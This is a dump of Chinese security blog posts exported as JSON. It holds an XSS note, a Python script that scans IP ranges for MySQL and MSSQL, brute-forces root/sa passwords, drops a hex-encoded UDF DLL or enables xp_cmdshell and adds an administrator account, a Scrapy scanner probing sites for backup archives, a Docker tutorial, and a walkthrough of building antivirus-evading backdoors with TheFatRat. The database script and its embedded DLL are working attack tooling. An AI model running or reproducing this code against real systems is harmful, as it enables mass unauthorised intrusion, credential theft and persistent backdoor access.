up后可以看到，有输入email的地方，和next两个参数输入点，一开始以为是输入框的问题，尝试多次发现没有写入页面。 然后再signup.html页面下发现如下内容 初步判断是next参数的问题，也就是next写入img标签，尝试如下，必须点击next，一开始点击GO，一直没触发。 javascript:alert(2)","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"批量获取数据库权限","slug":"批量获取数据库权限","date":"2018-09-28T02:05:11.000Z","updated":"2018-09-28T10:55:57.503Z","comments":true,"path":"2018/09/批量获取数据库权限/","link":"","permalink":"/2018/09/批量获取数据库权限/","excerpt":"","text":"眼看要到十一国庆小长假了，打算长假前写篇文章，巧合看到一篇老博文，dub ZJ居然要价七千，所以干脆写一个数据库ZJ脚本。 利用以下几点： 获取3306端口是否开放，开放后猜测root密码，密码猜测成功后，执行写入udf.dll，利用udf添加账号密码 。 获取1433端口是否开放，开放后猜测sa密码，密码猜测成功后，执行xp_cmdshell，2005以上就默认关闭了，获取sa权限之后重新开启，但还是需要在2008之前，利用xp_cmdshell写入远程账号密码。不过当用户已AUTHORITY\\NetworkService登陆时时（mssql2005express版默认）无法执行net user命令添加用户。只考虑了开启或者关闭xp_cmdshell的情况，删除的话暂不处理。 以上只针对Windows系统，数据库版本不高。 之所以采用这两种形式，一旦可以写入的话，即便没开启远程桌面，也可以利用udf或者xp_cmdshell开启远程桌面。 本地需要ip.txt 写入测试的IP网段，成功的会写入本地mysql，或者mssql 的txt文件。 如此，直接上代码，本地测试mysql没发现问题，如有考虑不周的或者认识错误的请告知。 `#coding:utf-8 import MySQLdb import pymssql import IPy import threading import Queue import socket import binascii class thread(threading.Thread): def init(self,queue): threading.Thread.init(self) self._queue = queue def run(self): while not self._queue.empty(): queue = self._queue.get(timeout=0.5) try: sock = socket.socket() sock.settimeout(2) try: sock.connect((queue, 3306)) print u&quot;检测到&quot; + queue + u&quot;:3306端口开放，测试中。。。&quot; self.mysql(queue) except: print queue + u&#39;:3306 端口关闭&#39; try: sock.connect((queue, 1433)) print u&quot;检测到&quot; + queue + u&quot;:1433端口开放，测试中。。。&quot; self.mssql(queue) except: print queue + u&#39;:1433 端口关闭&#39; except: continue def mysql(self,queue): with open(&#39;mm.txt&#39;,&#39;r&#39;) as f: file = f.readlines() for mm in file: try: db = MySQLdb.connect(queue, &quot;root&quot;, mm.strip(&#39;\\n&#39;), &quot;mysql&quot;, connect_timeout=2) print u&quot;爆破%s:3306端口成功，账号密码为: root/%s&quot; %(queue, mm.strip(&#39;\\n&#39;)) cursor = db.cursor() cursor.execute(&quot;SELECT VERSION()&quot;) data = cursor.fetchone() udf = binascii.a2b_hex(&quot;4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000F80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000004D477BD0092615830926158309261583005E86830B261583005E808308261583005E968307261583005E91830B2615832EE06E830A2615830926148325261583005E9C8308261583005E878308261583005E8483082615835269636809261583000000000000000000000000000000000000000000000000504500004C0103004AFE9F5A0000000000000000E00002210B010900001000000010000000600000607C0000007000000080000000000010001000000002000005000000000000000500000000000000009000000010000000000000020000000000100000100000000010000010000000000000100000007C83000008020000B4820000C800000000800000B402000000000000000000000000000000000000848500001000000000000000000000000000000000000000000000000000000000000000000000002C7E00004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000600000001000000000000000040000000000000000000000000000800000E0555058310000000000100000007000000010000000040000000000000000000000000000400000E02E7273726300000000100000008000000006000000140000000000000000000000000000400000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E393100555058210D090208B92BCF11B11CEEA24F550000560C000000220000260000A8FFFFFFFF8B4C240833C03901741656578B7C24146A0C59BE000010DCF3A566A55FB0015E5DFB77FBC38B44240C1A6A071611108BF8183218FF63DB6F1CA45FC7011E1200210883380175128B40040DF6776F0700750A1004C6000132C0C3530ABF1DF68D3C3053A454082D08FF30FF15FFF6EE776C885985C075085614C601011BC8568D71018A11FD6FDFFE4184D275F98B54142BCE890A32558BEC8B4D0C833902B7D860BF5374148B7D10915C5453EB4CBF9DBDDF8B417D740F1B707C1BEBE5836004DBB1FFB7001A0C8B48048B008D4401025072A0594C08DFC8D7B5891678113006A44CEB6C57BEB7B2B85F5E5DA30421740833DBB63FF6A8591353568B742410D878534602DB85DB5BB6460851C78D5C4257E8240B75EEEEBFE01400C604070008FF70041E0553B1DB1B921A22C418535720030054090F09B7086A995B0F98599954CF2D343713B8F4540B1EDEB60D818403552251519D35DFFED6FEDF576800F762D66A018945FC068BF08B4560DD7FF70CC606004533FF595939387471683CC071C6FEDFDA9C12260C3BC7745B506A04FF75FC149073E1EDD7A9FD48533AFC8D48911040B963DBFF2BC18BD88D043B505630F8268C5330D8AD8DBD5F03FE570E940DE57DF8463FE6364C2066BA5B1810A4803E0059169EB0FF741A8BC6C64437FF00594D1489C906987BEBD86F183E5F205EC9C3EED7B235DCBAF37D574708C45030087BDBDACDC9C26A4078C710548D4601B9E07E614251724F0856FF31CF6BAFDD9DB694C66AFF8DC32082F63A58B0B6030D092C23005F7CC36E57036C6A081D1290AC0AA88365FC2F6C2F2C2D4592D0EB071B408F65E8C70BBFD66E42FEFF000D1FEDC25E3BFFDB17B60D08209A02F3C3E90806F58BFF56688000002D8C6D675880985608845AA3BDE0FEBB062358045485F675054DAA83260076FBB7DB4508C36F08ED09ACC704240607FF0B4C113637598D71FFCF9C0BBF77DFC9750E39056B107E3CFF7310830B01FBEEC6BB8B0910548B098F57890A23480F85D47D618CBBAD641718068B79040838071B76EDEEBB1E50EB184AA705B8E61768B0B030D8E803A83C0957C1D6BBAEB5D6A1E7E9E2573CA12F4C6A6FF777C3025EFD096A1FEE76EB3CAA10C80475ED7BEFC0C7051F281A70E027071BDFF79D5CB520BC04B81B6A5635B952EB782B7339B2E3696FF7DEFD7340393D155C741C68062809AC43DB6B85850D9E1034252316FFE666F862F154B201DC0801592CC2B1A1DB78049DDFDBF62413D90FD4FC83F80266B16F6CB0D2595BFFA0584B77783BB5783106350F8487C71996EE4CD3543BF81810897D82EFC796BE35FAC87251833F8AF36A7C398587B4F10774E9FFC8D60F7C89C5DB9BB5D955F85615441B474DED5BE38EF88A394D1003D00874B48909437AA36D020C1AD3F8EBA71C3162CC5A64442E386161FB0A58064C32FC19503F1BDF720443375BC9C20CC710FB02231FB2288B2EF28B5D081CAE0FDB9B54E433C95CFC7D2008016C2DC6C23BF15A393A4417E4D61BFE7FAFAE3BF0740583FE02752E1910D03BC1E7166EB8ED57565FD03B5EE40003937B703B67115A039614168012376C7D270A8227FEA0246420575062B30D661327002F527F8DF61AD2061153F76A037543B067BB614F34032168742E2C0D2C3CEC257FEB1B71EC5A09706A7C6FAAE05051597C64825D900EADF62FFA8A19066B8F91B6C72AE490C396EC1640E134A9FF3B246ABB41C1F17926547DBC550C0D381E33BC05BC595D382281EC2832F7869F365F212043211C895E2118891D05F78EC243143C21A2AA210C668C186C5FFBDA3806252C0620080605DD2DCDD20425002D7FFC9C8F7AB6B1F6143095562407042831D6FEDB7F0807348B85E0FCA0AA701DDBB5B395011C1920241318092B18476A565F201CB360C32C9F7B8985D8320A04DC03B557E01B243468DEDFD1F7D8D360CE2879D40A2C833D208DBDC3DA00F923685B1B300BDFAF67F534C97F23401EC25F6A4849918F144A50152E9DF458AAF8A29C10F3EB67611C7E052C37D4598FEDED8321B9273551E0F5EE3BDC0ABF03E4507F4B8417185BDB7E600BCE1CDC142CD6E288B154B609E01B14F413160A4BDB313DDCDBFFDC84676CC859D94E1E07F7D81BF076BBB7C00359485D1656B8BC18BE04A3638B6F2AF83BC673080753025073D85F60835A3BFE72F15F5E25206C6053C820CC006F35B4DD452BB84D5A346627040B85BF2B5E6E413C03C1813850E45FEFA5ECFFFB33D2B90B011C48180F94C28BC25DC33FB702BF35E34831C80FB74114AE057106C1A55B6C33578C081817761BFFFF2FF1D7487BF972098B580803D93BFB720A4283C0283BD67270CA36B5E86AE55DC38F6AFEF0CD71F7A970040B056418005083EC080DB7C670082F316C33C576F0852F06DF64A31A89B90968555DB7F081F0B2091C6B04F555972DD12C937D1350195C083B04E1C26F2724C1E81FF715E0018FEFB6532B034F230059948BE55DC3621DDB49A301CA3DAFC0FAE99525242631CCFF29343232B61058054C50AC2CB41E97AF12B60D56096B27D7616B20CFB0FBEF2AE4E03160031F73D9665B9A6C038D2BE0FAFC046BA039F13CB4FC8A0D6C120C7D0DC395C3C1619C965154147FE41F3E783124F020140BDAC40E5643B25D53EC1068F885626DF4F888C9BF4EE640BB25EEA0398466820D85C33149DB9F0A359A04EB605675F869639FC1F6448B7598751F1033F0071476E6CA20189D271CB4F6EE6FEDF4330C113BF77507BE4F59EB0B85F30A7B047EA10AC1E0100BF0CE00F7D6076C840D1E045E5F01C33F5C05646464646064686C1405766474B000003FF4C20E034B0F20185F4E6F20FFFFB7FF617267756D656E7473096C6C6F77656420287564663A206C69625F6DCCFD6DF77973716C0D5F73085F696E666F293918DFB6FF8F2076657273696F6E20302E01341F45787065F6DBDBDD637447657861076C79201A65207374723F5BDB5AFB672074791B75726171217258C00E602B7477911FD86F030B3F8672206E616D48DBB1B71F436F756C246E6F74C4636113203058B76D186D2779AF72F1483FDA4D943F2003121071051BF29D5860214707D0604D0D0B0F81CB074ED961DD9703AB17CC2708A77527ECC00FD81F0A3B034FC0A07B851F03240328C1556583A200C5889251CA22D877BDB119BF44FF000F5565A3AA00A8AA9251645455C95532AAAAFFF61D455C0410020157616974466F00FC06C07253886C654F626A07C07F6B99145669727475616C417603E0F6370D536574456E76126F6EC000BC6DBF5661726961622B4118437265F76DEB6E94546806640D47264375727222CD12F65B502A636573734914266E03E083135469636BDE6E6BB1F6B6FD5175657279500366846D616E371667EF1B00FD0144697367374CFDB7EDED6962727879436192731A4973446562756767EDEE6DAD266A686546A4556E6840B1B7B7B7643164457846707469AF46696C4A6D295B6119B41254DE64AEB0176D0DD8114990B9EDD61A0A6B409D6D70876547C25A73CD517F77555122B4ED6E591B5C537973186DEEC3C2EB2E39417373650975697CDB15DA434C7D5F687E396D5F2EDFFEDEBE5F616D7367087869740B646A753A5F666469EC4217B076260A639A5F64FD6CADB91F5F686F6F6B131459725FF802700148D15FDB9CEB0249730A330A6C21D6F0BD82539C2A64D46E640893050B130F651E6B5B7BC25F2C723456ED6D1C182FF6D69A700A035F706F522947E1DDBE6E106468756C5EB92A6BCB92BD9B1B2CA806E0B6D86E6EC57265250866112E827BDB5673749C637079082439EDCD5C6B32C06E4D0FD7ED1F5AC36F7319663A1F5F4370705831C75E3B8474BC6D343F001817FFFFFFFF3D193C1C1B161E55142D16270815270F11115F10130A070D2E17090705160C1E7FFBFFFF080A0B160918181505061B050C10060717062105110F061421110B08E4FBDFB62B22052A111D0D18532D483806000776FBDBE5080C09330A090B0C051007061612EEDFFEED0E0B34150B18160D3D0542C205121E14066930FFD8DDFF110C0E1D4D0517230D0C3224080B4506F0DE041004F03B0A6EFF2C01043808041C1C0204003E4C016DFF21FD05004AFE9F5A8FE00002210B0109080C634F7AD60C1213D616A300200E10C10A01630B02AB3362B7EE6107006003040233351EEED9C0CE34100706C02633D6EDDB7620AC22033C144002B0021C5759DD0050520143C8C8BA65B1214200A7B82F06DB5D182EB4787407EA0B900C5BFA90CDB742602E72647D610861C90E76C508FB0A00C700A1DB66BB77402E26300304301BECDB943D001A27C04F73726300EB11C0061B40731C4F78C2C2A365761F01030002ED7760497B27421BA023030000EDD8D152127C53030400000000000080FF00000000000000000000807C2408010F85B901000060BE007000108DBE00A0FFFF5783CDFFEB0D9090908A064688074701DB75078B1E83EEFC11DB72EDB80100000001DB75078B1E83EEFC11DB11C001DB73EF75098B1E83EEFC11DB73E431C983E803720DC1E0088A064683F0FF747489C501DB75078B1E83EEFC11DB11C901DB75078B1E83EEFC11DB11C975204101DB75078B1E83EEFC11DB11C901DB73EF75098B1E83EEFC11DB73E483C10281FD00F3FFFF83D1018D142F83FDFC760F8A02428807474975F7E963FFFFFF908B0283C204890783C70483E90477F101CFE94CFFFFFF5E89F7B92A0000008A07472CE83C0177F7803F0075F28B078A5F0466C1E808C1C01086C429F880EBE801F0890783C70588D8E2D98DBE005000008B0709C0743C8B5F048D8430B472000001F35083C708FF96F0720000958A074708C074DC89F95748F2AE55FF96F472000009C07407890383C304EBE16131C0C20C0083C7048D5EFC31C08A074709C074223CEF771101C38B0386C4C1C01086C401F08903EBE2240FC1E010668B0783C702EBE28BAEF87200008DBE00F0FFFFBB0010000050546A045357FFD58D871702000080207F8060287F585054505357FFD558618D4424806A0039C475FA83EC80E9AD98FFFF0000004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000030001010220010010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005C80000056020000E404000000000000584000003C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C7472757374496E666F20786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7633223E0D0A202020203C73656375726974793E0D0A2020202020203C72657175657374656450726976696C656765733E0D0A20202020202020203C726571756573746564457865637574696F6E4C6576656C206C6576656C3D226173496E766F6B6572222075694163636573733D2266616C7365223E3C2F726571756573746564457865637574696F6E4C6576656C3E0D0A2020202020203C2F72657175657374656450726976696C656765733E0D0A202020203C2F73656375726974793E0D0A20203C2F7472757374496E666F3E0D0A20203C646570656E64656E63793E0D0A202020203C646570656E64656E74417373656D626C793E0D0A2020202020203C617373656D626C794964656E7469747920747970653D2277696E333222206E616D653D224D6963726F736F66742E564339302E435254222076657273696F6E3D22392E302E32313032322E38222070726F636573736F724172636869746563747572653D2278383622207075626C69634B6579546F6B656E3D2231666338623362396131653138653362223E3C2F617373656D626C794964656E746974793E0D0A202020203C2F646570656E64656E74417373656D626C793E0D0A20203C2F646570656E64656E63793E0D0A3C2F617373656D626C793E504100000000000000000000000010830000F08200000000000000000000000000001D83000008830000000000000000000000000000000000000000000028830000368300004683000056830000648300000000000072830000000000004B45524E454C33322E444C4C004D5356435239302E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F7465637400005669727475616C416C6C6F6300005669727475616C467265650000006672656500000000000000004AFE9F5A0000000058840000010000001200000012000000A4830000EC8300003484000021100000A312000000100000A4120000A3120000A0120000CC110000A31200009811000086110000A31200009811000076100000A3120000431000002E1100001A110000A91000006D84000083840000A0840000BB840000C7840000DA840000EB840000F484000004850000128500001B8500002B8500003985000041850000508500005D850000658500007485000000000100020003000400050006000700080009000A000B000C000D000E000F00100011006C69625F6D7973716C7564665F7379732E646C6C006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F62696E6576616C007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F6576616C007379735F6576616C5F6465696E6974007379735F6576616C5F696E6974007379735F65786563007379735F657865635F6465696E6974007379735F657865635F696E6974007379735F676574007379735F6765745F6465696E6974007379735F6765745F696E6974007379735F736574007379735F7365745F6465696E6974007379735F7365745F696E69740000000000700000100000006D3C683E6C3E0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;) if (data[0][0] &lt; 5) or ((data[0][0] == 5) and (data[0][2] &lt;= 1)): try: basedir = &quot;select &#39;%s&#39; into dumpfile &#39;c:\\\\windows\\\\system32\\\\udf.dll&#39;;&quot; %udf cursor.execute(basedir) cursor.execute(&quot;create function sys_eval returns string soname &#39;udf.dll&#39;;&quot;) cursor.execute(&quot;select cmdshell(&#39;net user wait wait /add&#39;);&quot;) cursor.execute(&quot;select cmdshell(&#39;net localgroup administrators wait /add&#39;);&quot;) with open(&quot;mysql.txt&quot;, &#39;a&#39;) as fs: fs.write(queue + u&quot;:3306 账号密码为 root/%s, 远程桌面账号密码为 wait/wait&quot;+&#39;\\n&#39;) % mm print queue + u&quot; udf 创建成功生成远程账号密码为：wait/wait&quot; except: print u&quot;udf执行失败&quot; else: try: cursor.execute(&quot;select @@basedir;&quot;) dir = cursor.fetchone() basedir1 = &quot;select &#39;plugin&#39; into dumpfile &#39;%s&#39;;&quot; %(dir[0]+&quot;lib/plugin::$INDEX_ALLOCATION&quot;) basedir2 = &quot;select &#39;%s&#39; into dumpfile &#39;%s&#39;;&quot; %(udf, dir[0]+&quot;lib/plugin/udf.dll&quot;) cursor.execute(basedir1) cursor.execute(basedir2) cursor.execute(&quot;create function sys_eval returns string soname &#39;udf.dll&#39;;&quot;) cursor.execute(&quot;select cmdshell(&#39;net user wait wait /add&#39;);&quot;) cursor.execute(&quot;select cmdshell(&#39;net localgroup administrators wait /add&#39;);&quot;) with open(&quot;mysql.txt&quot;, &#39;a&#39;) as fs: fs.write(queue + u&quot;:3306 账号密码为 root/%s, 远程桌面账号密码为 wait/wait&quot;+&#39;\\n&#39;) % mm print queue + u&quot; udf 创建成功生成远程账号密码为：wait/wait&quot; except: print u&quot;udf执行失败&quot; db.close() break except: continue def mssql(self,queue): with open(&#39;mm.txt&#39;,&#39;r&#39;) as f: file = f.readlines() for mm in file: try: db = pymssql.connect(host=queue, user=&quot;sa&quot;, password=mm.strip(&#39;\\n&#39;), database=&quot;master&quot;, connect_timeout=2) print u&quot;爆破%s:1433端口成功，账号密码为: sa/%s&quot; %(queue, mm.strip(&#39;\\n&#39;)) cursor = db.cursor() try: cursor.execute(&quot;exec master..xp_cmdshell &#39;whoami&#39;;&quot;) except: cursor.execute(&quot;EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;&quot;) try: cursor.execute(&quot;exec master..xp_cmdshell &#39;net user wait wait /add&#39;;&quot;) cursor.execute(&quot;exec master..xp_cmdshell &#39;net user administrators wait /add&#39;;&quot;) with open(&quot;mssql.txt&quot;,&#39;a&#39;) as fs: fs.write(queue+&quot;:1433 账号密码为 sa/%s, 远程桌面账号密码为 wait/wait&quot;+&#39;\\n&#39;) % mm.strip(&#39;\\n&#39;) except: print queue + u&quot; xp_cmdshell 执行失败&quot; db.close() except: continue def main(): queue = Queue.Queue() threads = [] with open(&quot;ip.txt&quot;) as f: file = f.readlines() for i in file: ip = i.strip(&#39;\\n&#39;) for x in IPy.IP(ip): queue.put(x) for i in xrange(1): threads.append(thread(queue)) for i in threads: i.start() for i in threads: i.join() if name == “main“: main() `","categories":[],"tags":[{"name":"python","slug":"python","permalink":"/tags/python/"}]},{"title":"基于scrapy的备份文件扫描","slug":"基于scrapy的备份文件扫描","date":"2018-09-27T02:51:38.000Z","updated":"2018-09-27T03:12:06.941Z","comments":true,"path":"2018/09/基于scrapy的备份文件扫描/","link":"","permalink":"/2018/09/基于scrapy的备份文件扫描/","excerpt":"","text":"Scrapy，Python开发的一个快速、高层次的屏幕抓取和web抓取框架，用于抓取web站点并从页面中提取结构化的数据。Scrapy用途广泛，可以用于数据挖掘、监测和自动测试。 首先生成项目文件 scrapy startproject spiderdata 生成成功后，会有以下目录结构，首先在spiderdata中的spider目录创建我们的spider文件。 备份文件扫描文件名，有两个选择，一是基于字典，二是根据url的备份文件名，从以往发现备份文件的结果上看，两种方式都是经常存在使用的。 于是创建backup文件，用来生成备份文件名，创建一个列表用来存储字典文件名，另外创建一个方法用来基于url生成备份文件名。 #coding:utf-8 import urlparse class backup(object): def __init__(self, url): self.url = url self.list2 = [&#39;/db.zip&#39;, &#39;/fdsa.rar&#39;, &#39;/ftp.rar&#39;, &#39;/gg.rar&#39;, &#39;/hdocs.rar&#39;, &#39;/hdocs.zip&#39;, &#39;/a.zip&#39;, &#39;/web.zip&#39;, &#39;/web.rar&#39;, &#39;/1.rar&#39;, &#39;/bbs.rar&#39;, &#39;/www.root.rar&#39;, &#39;/123.rar&#39;, &#39;/data.rar&#39;, &#39;/bak.rar&#39;, &#39;/oa.rar&#39;, &#39;/admin.rar&#39;, &#39;/www.rar&#39;, &#39;/2014.rar&#39;, &#39;/2015.rar&#39;, &#39;/2016.rar&#39;, &#39;/2014.zip&#39;, &#39;/2015.zip&#39;, &#39;/2016.zip&#39;, &#39;/2017.zip&#39;, &#39;/1.zip&#39;, &#39;/1.gz&#39;, &#39;/1.tar.gz&#39;, &#39;/2.zip&#39;, &#39;/2.rar&#39;, &#39;/123.rar&#39;, &#39;/123.zip&#39;, &#39;/a.rar&#39;, &#39;/a.zip&#39;, &#39;/admin.rar&#39;, &#39;/back.rar&#39;, &#39;/backup.rar&#39;, &#39;/bak.rar&#39;, &#39;/bbs.rar&#39;, &#39;/bbs.zip&#39;, &#39;/beifen.rar&#39;, &#39;/beifen.zip&#39;, &#39;/beian.rar&#39;, &#39;/data.rar&#39;, &#39;/data.zip&#39;, &#39;/HYTop.rar&#39;, &#39;/root.rar&#39;, &#39;/Release.rar&#39;, &#39;/Release.zip&#39;, &#39;/sql.rar&#39;, &#39;/test.rar&#39;, &#39;/template.rar&#39;, &#39;/template.zip&#39;, &#39;/upfile.rar&#39;, &#39;/vip.rar&#39;, &#39;/wangzhan.rar&#39;, &#39;/wangzhan.zip&#39;, &#39;/web.rar&#39;, &#39;/web.zip&#39;, &#39;/website.rar&#39;, &#39;/www.rar&#39;, &#39;/www.zip&#39;, &#39;/wwwroot.rar&#39;, &#39;/wwwroot.zip&#39;, &#39;/wz.rar&#39;] def backup(self): list_a = [] parse = urlparse.urlparse(self.url) name = parse.netloc.split(&#39;.&#39;) name_url = parse.netloc.replace(&#39;.&#39;, &#39;&#39;) for i in [&#39;.rar&#39;, &#39;.zip&#39;, &#39;.tar.gz&#39;, &#39;.7z&#39;]: list_a.append(parse.scheme + &#39;://&#39; + parse.netloc + &#39;/&#39; + parse.netloc + i) #http://www.baidu.com/www.baidu.com.zip if &#39;www&#39; in name: list_a.append(self.url + &#39;/&#39; + name[1] + i) #http://www.baidu.com/baidu.zip list_a.append(self.url + &#39;/&#39; + &#39;&#39;.join(name[1:]) + i) #http://www.baidu.com/baiducom.zip else: list_a.append(self.url + &#39;/&#39; + name[0] + i) #http://www.baidu.com/baidu.zip list_a.append(self.url + &#39;/&#39; + name_url + i) #http://www.baidu.com/wwwbaiducom.zip for x in self.list2: list_a.append(self.url + x) return list_a 在spider的爬虫文件中使用以下代码 #coding:utf-8 import scrapy from backup import backup from ..items import SpiderdateItem class spiderdata(scrapy.Spider): name = &quot;spiderdata&quot; content_type = [&#39;application/x-rar&#39;,&#39;application/x-gzip&#39;,&#39;application/zip&#39;,&#39;application/octet-stream&#39;,&#39;application/x-7z-compressed&#39;] def start_requests(self): with open(&#39;ip.txt&#39;,&#39;r&#39;) as f: for i in f.readlines(): ip = i.strip(&#39;\\n&#39;) back = backup(ip) url_ip = back.backup() for x in url_ip: yield scrapy.Request(x, callback=self.parse,dont_filter=True) def parse(self, response): item = SpiderdateItem() if response.headers[&#39;Content-Type&#39;] in self.content_type: print &quot;[&quot; + str(response.status) + &quot;]&quot; + u&#39; 检测到存在备份文件的URL: &#39;+ response.url item[&#39;url&#39;] = response.url yield item 调用之前创建的备份文件名函数，使用start_requests来生成一个可迭代对象。 数据通过item来保存本地，所以在items中创建一个参数，并且在settings中开启item管道。 url = scrapy.Field() 在piplines中创建本地文件保存文件，创建一次文件对象，写入后根据 爬虫关闭后再关闭本地文件。 def __init__(self): self.f = open(&quot;url.txt&quot;,&#39;w&#39;) def process_item(self, item, spider): self.f.write(item[&#39;url&#39;].encode(&quot;utf-8&quot;)+&#39;\\n&#39;) return item def close_spider(self, spider): self.f.close() 因此只需在spiderdata中创建ip.txt文件即可，写入需要检测的url，另外如果不想看到scrapy的log输出，可以用在setting中添加如下： LOG_LEVEL = &#39;WARNING&#39; 只显示warning级的log输出.","categories":[],"tags":[{"name":"python","slug":"python","permalink":"/tags/python/"}]},{"title":"使用docker创建镜像","slug":"使用docker创建镜像","date":"2018-09-25T06:40:17.000Z","updated":"2018-09-27T02:44:04.358Z","comments":true,"path":"2018/09/使用docker创建镜像/","link":"","permalink":"/2018/09/使用docker创建镜像/","excerpt":"","text":"在测试以及开源工具使用中，docker的便捷越来越成为快速部署的选择，那我们怎么构建自己的docker镜像。 构建Docker镜像有以下两种方法： 使用docker commit命令。 使用docker build命令和 Dockerfile 文件 docker commit命令首先我们在本地拉取ubuntu镜像作为基础的镜像环境。 如果我们在拉取的ubuntu镜像上安装 nginx，使用 docker run -it 镜像名 /bin/bash 这样进入需要修改的镜像内部。 首先按照一般操作步骤， apt-get update apt-get -y install nginx 等待构建结束后，使用exit退出，保存镜像，避免镜像内容丢失。 docker commit 修改的镜像id 用户名/仓库名 结束后便构建了一个设定好的镜像，如下所示。 如果需要上传镜像仓库，在https://hub.docker.com/注册登陆创建仓库即可，然后使用docker login登陆，此处使用的是命令行参数直接登陆。 执行：docker push 用户名/仓库名:标签 在hub.docker上就可以看到镜像信息了： 如需运行构建的docker docker run -d -p 80 --name web_web misakiyui/web nginx -g &quot;daemon off;&quot; –name: 容器名 nginx -g “daemon off;” 表示在镜像内运行的命令，在前台开启一个nginx进程 访问映射端口32768则可以看到安装的nginx了。 Dockerfile使用docker commit现在已经不推荐，推荐使用更为灵活的Dockerfile来构建镜像，如下Dockerfile，同样是在ubuntu下构建nginx FROM ubuntu:18.04 MAINTAINER misaki RUN apt-get update &amp;&amp; apt-get -y install nginx RUN echo &quot;hello world&quot; &gt; /var/www/html/index.nginx-debian.html EXPOSE 80 新建目录web，此目录就是构建环境目录。在Dockerfile中写入如下命令，FROM指构建环境，这里选用ubuntu 18.04版本，必须为第一行信息，注意这里都要小写，MAINTAINER指作者信息，RUN指在构建环境中需要运行的命令，每一个RUN都意味着建立一层，层数过多增加构建部署时间，也容易出错，所以尽量使用&amp;&amp;，在一层中构建命令。EXPOSE指应用程序使用容器的指定端口，设为80。也就是Dockerfile其实就是安装的每一条命令都写在一个文件内，这样运行后，程序自动的执行安装更新配置等等。 运行 docker run -t=&quot;misakiyui/web&quot; . (点是必须的)开始构建镜像 构建完成后再docker images中便可以看到设定的镜像了 运行 docker run -d -p 80 --name web_web misakiyui/web nginx -g &quot;daemon off;&quot; 开启镜像 这时候查看映射到本地的端口docker ps，本地映射32772端口，访问后就可以看到修改的信息和nginx了 。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"关于Thefatrat免杀使用","slug":"关于Thefatrat免杀使用","date":"2018-09-20T03:07:18.000Z","updated":"2018-09-20T05:18:56.082Z","comments":true,"path":"2018/09/关于Thefatrat免杀使用/","link":"","permalink":"/2018/09/关于Thefatrat免杀使用/","excerpt":"","text":"最近尝试了免杀工具thefatrat，记录一些使用过程和坑： 常见的免杀方式一般是：文件免杀方法和内存免杀方法 文件免杀指：加壳、加花等。内存免杀指：修改内存特征码、修改字符串等。 推荐一篇博文：http://anhkgg.com/aanti-virus/ 下面就记录thefatrat的使用和杀软查杀结果：采用在线查杀https://www.virustotal.com和http://www.virscan.org/language/zh-cn/ thefatrat的项目地址为：https://github.com/screetsec/thefatrat 安装步骤为： git clone https://github.com/Screetsec/TheFatRat.git cd TheFatRat chmod +x setup.sh &amp;&amp; ./setup.sh 安装后，建议查看logs文件夹下的fudwin文件,记录了安装使用中的存在的问题，比如使用中会出现There was an error creating your FUD rat with Powerstager 这种错误，查看fudwin文件，可以看到py2没有安装names模块，安装后正常使用。 再给以下文件权限 chmod + x fatrat chmod + x powerfull.sh ./fatrat 启动界面 第一项：利用msf生产后门，基本没免杀效果 第二项 ：利用powerstager混淆，从结果来看效果不错 第三项和第四项使用中报错和不能选择的问题，尚不得知问题原因，后续更新 第五项：生成apk后门 第六项：这个就是可以创建bat后门，但是里面还有c#编译和c编译等，但是被查杀率极高 第七项：生成office类后门 第八项：生成Linux后门 此次针对windows系统，下面用第二项的fudwin，进入后 使用第一项，第二项不确定是不是编码原因，全是乱码，选择后可以看到提示的本地IP和公网IP 执行完成后，在output文件夹下生成制定的exe文件，中间会选择图标 利用https://www.virustotal.com查看下效果如何，从结果上看不是很优秀，不过比较意外的是，360居然没查杀，国内几家免费杀软都没识别 尝试使用http://www.virscan.org/检查文件 结果更少，只有四个查杀(不确定是不是引擎版本问题) 从两个结果看 两边能查杀的国内杀软就江民杀毒，F-Secure在VirusTotal可以查杀，在VirSCAN没有查杀 运行文件查看是否能正常执行获得shell。 运行后用msf做监听，可以看到收到了shell thefatrat比较出众的一点就是可以生成bat后门文件，选择Create Fud Backdoor 1000% with PwnWinds 